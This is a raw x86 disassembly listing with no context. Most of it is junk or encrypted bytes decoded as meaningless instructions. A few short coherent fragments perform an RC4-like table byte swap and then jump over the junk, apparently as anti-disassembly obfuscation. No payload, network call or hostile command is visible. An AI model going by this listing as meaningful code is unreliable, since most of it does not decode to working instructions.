  412d5c:	mov    ecx,0xff40c2c5
  412d61:	jge    0x412dcf
  412d63:	pop    ebp
  412d64:	pusha  
  412d65:	push   cs
  412d66:	mov    ah,0x5d
  412d68:	inc    esp
  412d69:	js     0x412d21
  412d6b:	arpl   WORD PTR [esi+ebp*1+0x1d],di
  412d6f:	adc    BYTE PTR [ecx+0x6],0x93
  412d73:	imul   edx,DWORD PTR [edx],0x9ee9e9cd
  412d79:	xlat   BYTE PTR ds:[ebx]
  412d7a:	sub    bl,BYTE PTR [edi]
  412d7c:	and    eax,0xbed6243c
  412d81:	rcl    BYTE PTR [ebx],0x10
  412d84:	mov    ebx,0x3f8743a6
  412d89:	sub    al,0x7e
  412d8b:	enter  0xfe3f,0xf
  412d8f:	jle    0x412d92
  412d91:	cli    
  412d92:	cld    
  412d93:	je     0x412d5f
  412d95:	cmp    al,0xaa
  412d97:	sbb    eax,0xc2451e9c
  412d9c:	into   
  412d9d:	and    edx,DWORD PTR [edi+0x3c974e0e]
  412da3:	aad    0xe
  412da5:	enter  0x6f1b,0xb4
  412da9:	es mov dh,dl
  412dac:	or     al,al
  412dae:	ins    DWORD PTR es:[edi],dx
  412daf:	(bad)  
  412db0:	pop    es
  412db1:	ret    
  412db2:	jp     0x412db6
  412db4:	push   esp
  412db5:	lods   al,BYTE PTR ds:[esi]
  412db6:	lahf   
  412db7:	push   0x36930353
  412dbc:	mov    ebp,0x39fccc81
  412dc1:	xor    eax,0xe79b76b8
  412dc6:	mov    al,0xa2
  412dc8:	adc    BYTE PTR es:[ebx],dh
  412dcb:	aad    0xcc
  412dcd:	mov    dl,0x64
  412dcf:	nop
  412dd0:	lods   al,BYTE PTR ds:[esi]
  412dd1:	pop    eax
  412dd3:	dec    ebp
  412dd4:	iret   
  412dd5:	xchg   ebp,eax
  412dd6:	cs dec esi
  412dd8:	mov    bl,0x38
  412dda:	dec    esp
  412ddb:	sub    eax,0x778a9df1
  412de0:	shl    BYTE PTR [edx],cl
  412de2:	scas   al,BYTE PTR es:[edi]
  412de3:	lods   eax,DWORD PTR ds:[esi]
  412de4:	(bad)
  412de8:	ret    0xcb7c
  412deb:	sbb    eax,0x5de97478
  412df0:	icebp  
  412df1:	lods   eax,DWORD PTR ds:[esi]
  412df2:	repz adc DWORD PTR [edi],eax
  412df5:	mov    ds:0x75e2582f,al
  412dfa:	fadd   QWORD PTR [ebx]
  412dfc:	jno    0x412e5c
  412dfe:	lods   eax,DWORD PTR ds:[esi]
  412dff:	(bad)  
  412e00:	ficom  WORD PTR [ecx-0x2a8222fe]
  412e06:	lds    eax,FWORD PTR [esi+eax*4]
  412e09:	hlt    
  412e0a:	xchg   esi,eax
  412e0b:	mov    al,0x28
  412e0d:	push   esi
  412e0e:	dec    ecx
  412e0f:	je     0x412dd5
  412e11:	jle    0x412e68
  412e13:	lahf   
  412e14:	jae    0x412e77
  412e16:	push   ebx
  412e17:	xchg   ebx,eax
  412e18:	fbstp  TBYTE PTR [ebp+0x52108237]
  412e1e:	fprem  
  412e20:	sub    al,0x73
  412e22:	cmp    eax,0x2868cc2c
  412e27:	lock loope 0x412df7
  412e2a:	pop    eax
  412e2b:	aaa    
  412e2c:	(bad)  
  412e2d:	out    dx,eax
  412e2e:	inc    ebp
  412e2f:	mov    al,0xef
  412e31:	mov    bl,0xdd
  412e33:	scas   al,BYTE PTR es:[edi]
  412e34:	cmp    eax,0xca013241
  412e39:	stos   BYTE PTR es:[edi],al
  412e3a:	and    DWORD PTR [ecx+0x7],ebp
  412e3d:	pop    ds
  412e3e:	fcomp  QWORD PTR es:0x607edceb
  412e45:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412e46:	clc    
  412e47:	mov    ah,0xbd
  412e49:	sti    
  412e4a:	xchg   esi,eax
  412e4b:	dec    ebp
  412e4c:	inc    eax
  412e4d:	lock inc edi
  412e4f:	adc    BYTE PTR [esi+0x13d83001],dl
  412e55:	inc    esp
  412e56:	mov    bh,0xd9
  412e58:	fcomi  st,st(0)
  412e5a:	mov    dh,0xa8
  412e5c:	xor    esi,DWORD PTR [ebp+0x2798c00a]
  412e62:	or     BYTE PTR [eax],0xf
  412e65:	fs inc edi
  412e67:	addr16 or dl,al
  412e6a:	push   0x6d97b670
  412e6f:	stc    
  412e70:	jmp    DWORD PTR [eax+0x37]
  412e73:	pop    ebp
  412e74:	cmc    
  412e75:	repz push ebx
  412e77:	xchg   edi,eax
  412e78:	xchg   esp,eax
  412e79:	or     DWORD PTR [ecx],esp
  412e7b:	mov    DWORD PTR [eax-0x32296a17],0x9ca4357f
  412e85:	imul   ecx,ebx,0xd96dd21a
  412e8b:	mov    dl,0xa2
  412e8d:	or     al,0xf0
  412e8f:	(bad)  
  412e90:	(bad)  
  412e91:	bound  ebx,QWORD PTR [ebx+0x24]
  412e94:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412e95:	jmp    0x412ef4
  412e97:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412e98:	daa    
  412e99:	(bad)  [ebp+esi*8-0x4c429414]
  412ea0:	jo     0x412e4f
  412ea2:	mov    bh,0xec
  412ea4:	jge    0x412eba
  412ea6:	xor    dh,dl
  412ea8:	les    eax,FWORD PTR [ebp+0x5f]
  412eab:	cmp    dh,BYTE PTR [esi+0x79]
  412eae:	stc    
  412eaf:	mov    WORD PTR [edi],?
  412eb1:	adc    al,0x7a
  412eb3:	bts    DWORD PTR [ebx-0x4d],ebx
  412eb7:	mov    cl,0xe3
  412eb9:	push   0xffffffc3
  412ebb:	mov    eax,ds:0x971efffa
  412ec0:	jle    0x412e70
  412ec2:	pushf  
  412ec3:	out    0xb,eax
  412ec5:	sbb    ebp,DWORD PTR [esi-0x2938000]
  412ecb:	dec    ebp
  412ecc:	jmp    0x412ee3
  412ece:	xor    esi,DWORD PTR [edi-0x1]
  412ed1:	xchg   ecx,eax
  412ed2:	dec    ebp
  412ed3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412ed4:	mov    dh,0x44
  412ed6:	pop    ds
  412ed7:	pop    ss
  412ed8:	jbe    0x412ef8
  412eda:	addr16 fsub st,st(3)
  412edd:	mov    ch,BYTE PTR [ebp+0x2f]
  412ee0:	ret    0x1be2
  412ee3:	retf   
  412ee4:	retf   
  412ee5:	ja     0x412ef4
  412ee7:	inc    ebp
  412ee8:	xchg   ecx,eax
  412ee9:	scas   al,BYTE PTR es:[edi]
  412eea:	pop    ds
  412eeb:	jns    0x412e71
  412eed:	lea    ebp,[esp+edi*8-0x4]
  412ef1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412ef2:	inc    edx
  412ef3:	and    al,BYTE PTR [ecx]
  412ef5:	fdivr  DWORD PTR [eax]
  412ef7:	lea    esp,[ebx]
  412ef9:	mov    BYTE PTR [ebp+0xf],dl
  412efc:	mov    edx,DWORD PTR [ebp-0xc]
  412eff:	xor    edx,eax
  412f01:	add    edx,DWORD PTR [ebp-0x14]
  412f04:	mov    edi,DWORD PTR [ebp-0x1c]
  412f07:	mov    dl,BYTE PTR [edx+edi*1+0x327298]
  412f0e:	mov    BYTE PTR [ebp+0xb],dl
  412f11:	mov    dl,BYTE PTR [ebp+0xf]
  412f14:	jmp    0x41319c
  412f19:	aas    
  412f1a:	cmp    eax,0x3e3d3e3f
  412f1f:	cmp    eax,0xcf00063d
  412f24:	sbb    al,0x44
  412f26:	pop    edi
  412f27:	cli    
  412f28:	sbb    al,0x69
  412f2a:	jne    0x412fa4
  412f2c:	js     0x412f13
  412f2e:	jle    0x412fa8
  412f30:	js     0x412f78
  412f32:	retf   0x1b0b
  412f35:	rol    BYTE PTR [edx+ebp*1+0x2a0e0080],0x7d
  412f3d:	adc    edi,DWORD PTR [ebx]
  412f3f:	call   0xcea3b11b
  412f44:	mov    ds:0x4c38f858,eax
  412f49:	adc    bl,BYTE PTR [edx+0x6f8c7641]
  412f4f:	pop    ebp
  412f50:	mov    bl,0x43
  412f52:	fild   QWORD PTR [eax+0x95d3eb7]
  412f58:	mov    ch,BYTE PTR [eax+0x63e37d4d]
  412f5e:	push   edx
  412f5f:	test   al,0x47
  412f61:	dec    esi
  412f62:	xchg   ebx,eax
  412f63:	xor    DWORD PTR [ebp-0x1e74fa50],esp
  412f69:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412f6a:	into   
  412f6b:	inc    ebp
  412f6c:	(bad)  
  412f6d:	and    eax,0x62da71cd
  412f72:	mov    eax,ds:0xf3d853ce
  412f77:	arpl   ax,ax
  412f79:	call   0x692bb5dd
  412f7e:	push   ds
  412f7f:	(bad)  
  412f80:	(bad)  
  412f81:	xor    al,BYTE PTR [ebx+0x5b14082a]
  412f87:	int3   
  412f88:	inc    ebx
  412f89:	dec    ebp
  412f8a:	pop    esi
  412f8b:	or     ch,BYTE PTR [ebx+0x6e]
  412f8e:	add    al,0xe6
  412f90:	je     0x413007
  412f92:	ret    
  412f93:	bound  edx,QWORD PTR [edi-0x145a83dc]
  412f99:	xchg   edi,eax
  412f9a:	ss and eax,edi
  412f9d:	xor    edi,DWORD PTR [ecx+0x6b]
  412fa0:	sbb    edx,edx
  412fa2:	js     0x41301b
  412fa4:	push   ecx
  412fa5:	ret    
  412fa6:	jb     0x412fff
  412fa8:	fwait
  412fa9:	leave  
  412faa:	dec    esi
  412fab:	mov    edi,0x28e05146
  412fb0:	pusha  
  412fb1:	enter  0x7740,0x8d
  412fb5:	dec    ebx
  412fb6:	mov    al,ds:0xe597f105
  412fbb:	int3   
  412fbc:	and    DWORD PTR [esp+edi*2],ebx
  412fbf:	add    DWORD PTR [eax],ecx
  412fc1:	neg    DWORD PTR [ecx+0x4c564592]
  412fc7:	mov    ebp,0xb66b5e13
  412fcc:	daa    
  412fcd:	nop
  412fce:	bound  esi,QWORD PTR [esp+ecx*2+0x0]
  412fd2:	lods   eax,DWORD PTR ds:[esi]
  412fd3:	jbe    0x412fae
  412fd5:	inc    esi
  412fd6:	mov    esi,0x458be0ed
  412fdb:	(bad)  
  412fdc:	js     0x412fc6
  412fde:	mov    esp,0xce3b28f5
  412fe3:	xchg   DWORD PTR [ecx-0x30],esi
  412fe6:	inc    edx
  412fe7:	mov    ebp,0xce1a8d42
  412fec:	push   ebp
  412fed:	and    esp,0x40ecb2c2
  412ff3:	stc    
  412ff4:	sbb    BYTE PTR [eax],bl
  412ff6:	sbb    eax,0x5d2adfd8
  412ffb:	out    0xb4,al
  412ffd:	mov    DWORD PTR [ecx-0x5426f056],edi
  413003:	xor    eax,0x24d7288a
  413008:	(bad)  
  413009:	scas   al,BYTE PTR es:[edi]
  41300a:	std    
  41300b:	add    DWORD PTR es:[eax-0x1fa084cd],esi
  413012:	call   FWORD PTR [esi-0x4d]
  413015:	cmp    ah,al
  413017:	enter  0xe79e,0xdc
  41301b:	ffreep st(0)
  41301d:	out    0xc0,eax
  41301f:	pop    ebx
  413020:	push   cs
  413021:	out    0x64,eax
  413023:	sbb    bl,cl
  413025:	outs   dx,BYTE PTR ds:[esi]
  413026:	retf   0x65d6
  413029:	mov    al,0x19
  41302b:	ds icebp 
  41302d:	in     al,dx
  41302e:	jmp    0x412fe1
  413030:	loop   0x413008
  413032:	fwait
  413033:	popw   ss
  413035:	ror    DWORD PTR [esi-0x2abb1c04],cl
  41303b:	gs jbe 0x413081
  41303e:	or     BYTE PTR [ebx+0x432026ad],0x60
  413045:	cli    
  413046:	dec    eax
  413047:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413048:	sub    cl,BYTE PTR [eax]
  41304a:	icebp  
  41304b:	mov    ecx,0x827670ee
  413050:	int    0x1b
  413052:	push   edi
  413053:	(bad)  
  413054:	sbb    al,0xff
  413056:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413057:	(bad)  
  413058:	pop    edx
  413059:	stos   BYTE PTR es:[edi],al
  41305a:	mov    ebx,0xf885b563
  41305f:	imul   esp,edx,0x37
  413062:	test   al,0x8
  413064:	ja     0x413019
  413066:	push   ecx
  413067:	xor    BYTE PTR [edi-0x55],ch
  41306a:	push   ss
  41306b:	inc    ecx
  41306c:	inc    ebx
  41306d:	inc    ecx
  41306e:	inc    eax
  41306f:	repnz (bad) 
  413071:	dec    eax
  413072:	adc    BYTE PTR [ecx],0xe9
  413075:	lock mov ebp,0xd83efbac
  41307b:	sbb    esi,DWORD PTR [esi+0x5e]
  41307e:	(bad)  
  41307f:	jnp    0x4130b9
  413081:	(bad)  
  413082:	dec    edx
  413083:	sub    al,0x95
  413085:	arpl   WORD PTR [ebx+0x523d25e8],dx
  41308b:	in     eax,0x1
  41308d:	(bad)  
  41308e:	outs   dx,DWORD PTR ds:[esi]
  41308f:	or     DWORD PTR [eax],ebp
  413091:	mov    esp,0x6a1a346e
  413096:	jp     0x4130d9
  413098:	jecxz  0x41309f
  41309a:	(bad)  [esi]
  41309c:	push   ecx
  41309d:	sub    al,0x6d
  41309f:	arpl   WORD PTR [eax+edi*8-0x1841bda0],cx
  4130a6:	(bad)  
  4130a7:	jle    0x413073
  4130a9:	inc    ebx
  4130aa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4130ab:	adc    DWORD PTR [esi+eiz*4],0x8
  4130af:	js     0x413068
  4130b1:	retf   0xd8aa
  4130b4:	neg    ch
  4130b6:	setb   BYTE PTR [ebx-0x4ae0aa28]
  4130bd:	push   esi
  4130be:	mov    ch,0x31
  4130c0:	add    al,0xe
  4130c2:	je     0x41312c
  4130c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4130c5:	dec    edx
  4130c6:	ret    0x3d30
  4130c9:	iret   
  4130ca:	adc    al,0x1c
  4130cc:	fwait
  4130cd:	das    
  4130ce:	pop    ecx
  4130cf:	xlat   BYTE PTR ds:[ebx]
  4130d0:	sahf   
  4130d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4130d2:	jmp    0x4130ab
  4130d4:	adc    dh,ah
  4130d6:	mov    ds:0x945b6bd3,eax
  4130db:	jb     0x4130cd
  4130dd:	shl    DWORD PTR [ecx+0x542b4cde],cl
  4130e3:	stos   DWORD PTR es:[edi],eax
  4130e4:	nop
  4130e5:	ror    BYTE PTR [edi],1
  4130e7:	mov    dl,0xec
  4130e9:	test   al,0x69
  4130eb:	pusha  
  4130ec:	push   cs
  4130ed:	push   esi
  4130ee:	mov    dl,0xef
  4130f0:	test   al,0x91
  4130f2:	mul    esi
  4130f4:	ret    
  4130f5:	out    dx,al
  4130f6:	bound  eax,QWORD PTR [ecx-0x6c453b2e]
  4130fc:	cmp    DWORD PTR [edi],ecx
  4130fe:	lea    edi,[ebp-0x4f]
  413101:	mov    bl,0x44
  413103:	dec    ebx
  413104:	jb     0x4130af
  413106:	jle    0x413183
  413108:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413109:	test   al,0x33
  41310b:	div    ch
  41310d:	scas   al,BYTE PTR es:[edi]
  41310e:	out    dx,al
  41310f:	jge    0x413176
  413111:	jbe    0x41312f
  413113:	std    
  413114:	push   edx
  413115:	jle    0x413160
  413117:	(bad)  
  413118:	sbb    eax,0xcdf76f5b
  41311d:	int    0x1e
  41311f:	mov    edi,0x331285d7
  413124:	int3   
  413125:	fisubr WORD PTR [esi]
  413127:	dec    edx
  413128:	jo     0x41316a
  41312a:	add    DWORD PTR [edx+0x58ec8780],0xffffffbf
  413131:	loopne 0x413138
  413133:	outs   dx,BYTE PTR ds:[esi]
  413134:	sbb    cl,ah
  413136:	stc    
  413137:	sub    dl,dh
  413139:	xchg   BYTE PTR ds:0xd3cea1b0,bl
  41313f:	pop    esp
  413140:	test   BYTE PTR cs:[ebx-0x613b0f1c],al
  413147:	out    0xbf,eax
  413149:	mov    edi,DWORD PTR [eax+0x60c32a8e]
  41314f:	mov    eax,DWORD PTR ds:0x1d01149a
  413155:	je     0x41319f
  413157:	jbe    0x4130f6
  413159:	fidivr WORD PTR [eax+0x3fc9d53c]
  41315f:	jl     0x41313a
  413161:	adc    BYTE PTR [ebx+0x4be2d019],ch
  413167:	aas    
  413168:	pop    esp
  413169:	or     al,0x67
  41316b:	(bad)  
  41316c:	jno    0x41318f
  41316e:	icebp  
  41316f:	ins    WORD PTR es:[edi],dx
  413171:	cmp    edi,0xcde8a4e7
  413177:	cmp    esp,DWORD PTR [ecx]
  413179:	inc    esi
  41317a:	iret   
  41317b:	cli    
  41317c:	inc    edx
  41317d:	mov    dh,ch
  41317f:	xor    edi,DWORD PTR [ebx+0x41301b7]
  413185:	and    cl,BYTE PTR [edx-0x7a]
  413188:	inc    esp
  413189:	xlat   BYTE PTR ds:[ebx]
  41318a:	jge    0x4131e5
  41318c:	jae    0x4131f2
  41318e:	(bad)  
  41318f:	mov    edx,0x3d6fac87
  413194:	jl     0x41315f
  413196:	mov    ah,0x5f
  413198:	pop    ebp
  413199:	push   ds
  41319a:	ins    DWORD PTR es:[edi],dx
  41319b:	ret    0x7d8b
  41319e:	hlt    
  41319f:	xor    edi,eax
  4131a1:	add    edi,DWORD PTR [ebp-0x14]
  4131a4:	mov    ebx,DWORD PTR [ebp-0x1c]
  4131a7:	mov    BYTE PTR [edi+ebx*1+0x327298],dl
  4131ae:	mov    dl,BYTE PTR [ebp+0xb]
  4131b1:	mov    edi,DWORD PTR [ebp-0x18]
  4131b4:	xor    edi,eax
  4131b6:	jmp    0x41343e
  4131bb:	cmp    eax,0xc2c6c2c3
  4131c0:	(bad)
  4131c3:	pop    ebp
  4131c4:	in     al,0x25
  4131c6:	inc    edi
  4131c7:	jmp    0x41316e
  4131c9:	mov    eax,0x787ad688
  4131ce:	js     0x4131b5
  4131d0:	jle    0x41324a
  4131d2:	js     0x4131f9
  4131d4:	cdq    
  4131d5:	aaa    
  4131d6:	inc    esp
  4131d7:	xchg   edx,eax
  4131d8:	cmp    DWORD PTR [ebx+0x5cffdc38],edx
  4131de:	add    DWORD PTR [edx-0x7cad8176],0x69
  4131e5:	mov    ?,WORD PTR [ebp+0x2b]
  4131e8:	mov    eax,ds:0xb79272a0
  4131ed:	aam    0xfe
  4131ef:	in     eax,dx
  4131f0:	pop    esp
  4131f1:	and    BYTE PTR [esi],ch
  4131f3:	sbb    al,0x76
  4131f5:	(bad)  
  4131f6:	(bad)  
  4131f7:	faddp  st(5),st
  4131f9:	imul   ebx,edi,0x37284e59
  4131ff:	out    0x3a,al
  413201:	xchg   ebx,eax
  413202:	cmp    ah,BYTE PTR [edx]
  413204:	xor    eax,0xb46b776c
  413209:	sub    BYTE PTR [ebx+0x55b0db54],0x9f
  413210:	mov    cs,ebp
  413212:	ret    
  413213:	pop    ss
  413214:	cmp    cl,BYTE PTR [ebp+ecx*4+0x46]
  413218:	ins    DWORD PTR es:[edi],dx
  413219:	pushf  
  41321a:	(bad)
  41321f:	scas   eax,DWORD PTR es:[edi]
  413220:	push   cs
  413221:	pop    esp
  413222:	mov    dh,0x7b
  413224:	mov    eax,ds:0x93ae098b
  413229:	mov    eax,0xf9a1886c
  41322e:	stc    
  41322f:	sbb    al,0xa8
  413231:	sub    ebx,esp
  413233:	nop
  413234:	add    DWORD PTR ds:0x2b627dfa,esi
  41323a:	imul   esp,DWORD PTR [edx-0x68],0x5d
  41323e:	pushf  
  41323f:	inc    ebp
  413240:	(bad)  
  413241:	das    
  413242:	mov    al,0x52
  413244:	mov    eax,0xf02d5d89
  413249:	inc    BYTE PTR [esi]
  41324b:	fistp  DWORD PTR [ecx]
  41324d:	push   0xffffff9b
  41324f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413250:	xchg   esi,eax
  413251:	cmp    BYTE PTR [ebx+0x3734175c],bh
  413257:	clc    
  413258:	adc    edi,eax
  41325a:	mov    al,ds:0xf72f68dd
  41325f:	push   ecx
  413260:	in     al,dx
  413261:	js     0x4132c1
  413263:	stos   DWORD PTR es:[edi],eax
  413264:	mov    dh,0x56
  413266:	or     dl,BYTE PTR [edx+0x77]
  413269:	xchg   edx,eax
  41326a:	or     BYTE PTR [edi-0xd],0xd0
  41326e:	inc    esp
  41326f:	sub    al,BYTE PTR [esi-0x4c]
  413272:	fwait
  413273:	inc    esi
  413274:	sbb    BYTE PTR [ebx-0x87ab713],dh
  41327a:	iret   
  41327b:	mov    eax,ebx
  41327d:	jae    0x4132bf
  41327f:	shr    BYTE PTR [esi+0x34424f60],1
  413285:	sbb    DWORD PTR [ebp-0x4cef7277],ebx
  41328b:	push   esp
  41328c:	xchg   ecx,eax
  41328d:	jo     0x41323b
  41328f:	sub    ebx,esp
  413291:	jecxz  0x4132c6
  413293:	je     0x4132c1
  413295:	adc    eax,0xf38fe983
  41329a:	mov    WORD PTR [eax+0x2d9d4513],ss
  4132a0:	or     dl,BYTE PTR [edi+0x488c656b]
  4132a6:	test   eax,0x8dc12328
  4132ab:	das    
  4132ac:	loope  0x4132d7
  4132ae:	sub    cl,BYTE PTR [edx+edi*2]
  4132b1:	rcl    eax,cl
  4132b3:	pop    esi
  4132b4:	clc    
  4132b5:	inc    esp
  4132b6:	jge    0x4132e0
  4132b8:	xchg   ebp,eax
  4132b9:	pop    ds
  4132ba:	pop    ds
  4132bb:	sahf   
  4132bc:	jp     0x41324a
  4132be:	enter  0x81f4,0x52
  4132c2:	inc    sp
  4132c4:	mov    eax,ds:0x574a4bfe
  4132c9:	lea    edi,ds:0x72bf0754
  4132cf:	jno    0x413274
  4132d1:	pop    esp
  4132d2:	sar    BYTE PTR [ecx+0x32],cl
  4132d5:	jg     0x41325d
  4132d7:	mov    BYTE PTR [eax+0x71],0x7b
  4132db:	jb     0x4132ef
  4132dd:	mov    ebx,0xc898731b
  4132e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4132e3:	push   0xffffffd7
  4132e5:	shr    DWORD PTR [ecx],0xd2
  4132e8:	idiv   BYTE PTR [edx-0x473e5efc]
  4132ee:	mov    eax,DWORD PTR ss:[eax+0x29f03cc2]
  4132f5:	xchg   ebx,eax
  4132f6:	pop    ebx
  4132f7:	in     al,dx
  4132f8:	cmp    eax,0xd15aae8d
  4132fd:	or     DWORD PTR [ebp-0x73],ebx
  413300:	mov    eax,ds:0x5db6f3b5
  413305:	loop   0x4132b6
  413307:	pop    esi
  413308:	into   
  413309:	add    ch,al
  41330b:	xor    edi,DWORD PTR [ecx-0x8]
  41330e:	inc    ecx
  41330f:	xchg   edx,eax
  413310:	stc    
  413311:	and    eax,0x8a1b07f1
  413316:	sub    bl,dh
  413318:	fimul  DWORD PTR [edx-0x3c87311c]
  41331e:	stc    
  41331f:	daa    
  413320:	repz (bad) 
  413322:	and    eax,0x689f88b
  413327:	loop   0x41335c
  413329:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41332a:	jno    0x4132f7
  41332c:	xchg   esi,eax
  41332d:	and    ch,BYTE PTR [ecx+0x467ff0a9]
  413333:	push   ebp
  413334:	mov    ebp,edx
  413336:	gs jne 0x413339
  413339:	push   ds
  41333a:	sbb    al,0xa1
  41333c:	js     0x4133a3
  41333e:	mov    cl,0x22
  413340:	addr16 loopne 0x413312
  413343:	mov    ds:0x6654aa67,al
  413348:	or     dh,BYTE PTR [edi-0x724ff713]
  41334e:	test   al,0xd8
  413350:	or     eax,0xab16c0cd
  413355:	mov    bh,0x72
  413357:	(bad)  
  413359:	push   ebx
  41335a:	test   DWORD PTR [edx+0x58381dd9],esp
  413360:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413361:	(bad)  
  413363:	bound  ebp,QWORD PTR [esi]
  413365:	mov    edx,0x15193493
  41336a:	outs   dx,BYTE PTR ds:[esi]
  41336b:	xor    BYTE PTR [ecx+0xb],bl
  41336e:	jl     0x4133cb
  413370:	cmp    bl,BYTE PTR [edi-0x5b]
  413373:	sbb    al,bl
  413375:	daa    
  413376:	cmp    DWORD PTR [edx+0x74],ebx
  413379:	pop    ebx
  41337a:	retf   0xd4ca
  41337d:	dec    eax
  41337e:	push   eax
  41337f:	rcr    edi,1
  413381:	mov    edi,0xeb9c8ec6
  413386:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413387:	sbb    bl,BYTE PTR [eax+esi*4+0x78]
  41338b:	dec    esi
  41338c:	call   0xccc6:0x811eda4c
  413393:	dec    esi
  413394:	stc    
  413395:	je     0x413332
  413397:	lahf   
  413398:	ror    BYTE PTR [edx+0x75],1
  41339b:	retf   0x55b9
  41339e:	mov    ebp,0xa6f2fd9f
  4133a3:	ins    DWORD PTR es:[edi],dx
  4133a4:	pusha  
  4133a5:	aam    0xff
  4133a7:	mov    edi,0xf9d9a363
  4133ac:	in     eax,dx
  4133ad:	and    ebx,DWORD PTR [ebx]
  4133af:	aaa    
  4133b0:	inc    ebx
  4133b1:	inc    esp
  4133b2:	mov    ebp,0x4817d1fc
  4133b7:	mov    DWORD PTR [eax+ebp*4+0x306a7d92],edx
  4133be:	loop   0x41343b
  4133c0:	or     DWORD PTR [ebp+esi*4+0x7e2cfd67],edx
  4133c7:	mov    edi,0xd505665b
  4133cc:	xor    DWORD PTR [edx-0x3a],eax
  4133cf:	ins    DWORD PTR es:[edi],dx
  4133d0:	xchg   edi,eax
  4133d1:	cmp    al,0xe7
  4133d3:	add    DWORD PTR ds:0x9497462a,edx
  4133d9:	pop    ds
  4133da:	ret    0x495d
  4133dd:	imul   eax,DWORD PTR [edi],0x59
  4133e0:	scas   eax,DWORD PTR es:[edi]
  4133e1:	loop   0x41337d
  4133e3:	xchg   esp,eax
  4133e4:	mov    BYTE PTR [esi],bl
  4133e6:	jle    0x4133cf
  4133e8:	pop    ds
  4133e9:	push   ds
  4133ea:	int3   
  4133eb:	mov    ds:0x14a1c014,eax
  4133f0:	in     eax,0xda
  4133f2:	sbb    esi,DWORD PTR [esi]
  4133f4:	xchg   edx,eax
  4133f5:	adc    esi,DWORD PTR [eax]
  4133f7:	cli    
  4133f8:	jns    0x413394
  4133fa:	pop    ds
  4133fb:	mov    BYTE PTR [eax+0x6],cl
  4133fe:	stos   BYTE PTR es:[edi],al
  4133ff:	xchg   edx,eax
  413400:	dec    eax
  413401:	mov    ds:0x8302a956,al
  413406:	test   eax,0x791d292b
  41340b:	pop    eax
  41340c:	mov    esp,DWORD PTR [esp+esi*1+0x21]
  413410:	aaa    
  413411:	dec    eax
  413412:	in     eax,dx
  413413:	repz shl BYTE PTR [ebx-0x5a],cl
  413417:	fild   DWORD PTR [edx-0x37]
  41341a:	mov    ds:0x5d045a95,eax
  41341f:	or     DWORD PTR ds:0xad072591,ebx
  413425:	mov    al,ds:0xf59a03e
  41342a:	xor    al,0xa2
  41342c:	pop    ebx
  41342d:	imul   ecx,DWORD PTR [ebx],0xffffffd3
  413430:	fwait
  413431:	pushf  
  413432:	(bad)  
  413433:	(bad)  
  413435:	or     cl,BYTE PTR [edx+0x777436fd]
  41343b:	dec    esp
  41343c:	repnz xor al,BYTE PTR [ebx]
  41343f:	jge    0x41342d
  413441:	mov    ebx,DWORD PTR [ebp-0x1c]
  413444:	mov    BYTE PTR [edi+ebx*1+0x327298],dl
  41344b:	jmp    0x4136d3
  413450:	enter  0xd1c5,0xc0
  413454:	(bad)  
  413456:	(bad)  
  413458:	cld    
  413459:	imul   ecx,esi,0xe497675e
  41345f:	ins    BYTE PTR es:[edi],dx
  413460:	inc    ebx
  413461:	js     0x4134e2
  413463:	js     0x41344a
  413465:	jle    0x4134df
  413467:	js     0x41343a
  413469:	and    edi,DWORD PTR [edx]
  41346b:	xlat   BYTE PTR ds:[ebx]
  41346c:	pop    edx
  41346d:	sub    eax,0xd7c26fb8
  413472:	fisttp DWORD PTR [eax]
  413474:	pop    esi
  413475:	xchg   ecx,eax
  413476:	ins    BYTE PTR es:[edi],dx
  413477:	pop    ebx
  413478:	jnp    0x4134d2
  41347a:	xchg   esi,eax
  41347b:	mov    ebx,0x43a8c3a7
  413480:	aam    0xc3
  413482:	ret    0x39d6
  413485:	test   eax,0xdb49ced4
  41348a:	mov    dl,0x66
  41348c:	mov    DWORD PTR [eax+0xa67bbb2],ebp
  413492:	xor    eax,0xf074cee3
  413497:	sub    DWORD PTR ds:0xb2b843bb,edi
  41349d:	aaa    
  41349e:	jmp    DWORD PTR [edx]
  4134a0:	aaa    
  4134a1:	jmp    0x4e56:0x67e30241
  4134a8:	sbb    al,0x20
  4134aa:	add    al,0x63
  4134ac:	pop    esp
  4134ad:	test   DWORD PTR [edi],ebp
  4134af:	clc    
  4134b0:	int    0x73
  4134b2:	mov    eax,ds:0xa80f6404
  4134b7:	retf   
  4134b8:	mov    ds:0x56ae32b3,al
  4134bd:	inc    eax
  4134be:	pushf  
  4134bf:	pop    es
  4134c0:	sbb    dl,BYTE PTR [ebp+0xb]
  4134c3:	dec    ecx
  4134c4:	(bad)  
  4134c5:	loop   0x41347a
  4134c7:	rcr    cl,0xce
  4134ca:	sub    eax,0xf8c68af0
  4134cf:	or     esp,DWORD PTR [ebp+0x43e868de]
  4134d5:	xor    DWORD PTR [ecx],0x3a7d8228
  4134db:	out    0xec,eax
  4134dd:	(bad)  
  4134de:	aam    0x91
  4134e0:	cmc    
  4134e1:	jle    0x4134a6
  4134e3:	xor    eax,0x9205a8bc
  4134e8:	hlt    
  4134e9:	dec    ebp
  4134ea:	dec    esi
  4134eb:	ins    DWORD PTR es:[edi],dx
  4134ec:	jne    0x4134a4
  4134ee:	outs   dx,BYTE PTR ds:[esi]
  4134ef:	test   DWORD PTR [edi-0x8a25f2a],edi
  4134f5:	repz in eax,dx
  4134f7:	sbb    edx,DWORD PTR [ecx]
  4134f9:	mov    al,0x75
  4134fb:	in     al,0xdd
  4134fd:	out    0xa0,eax
  4134ff:	and    eax,0xaafe300d
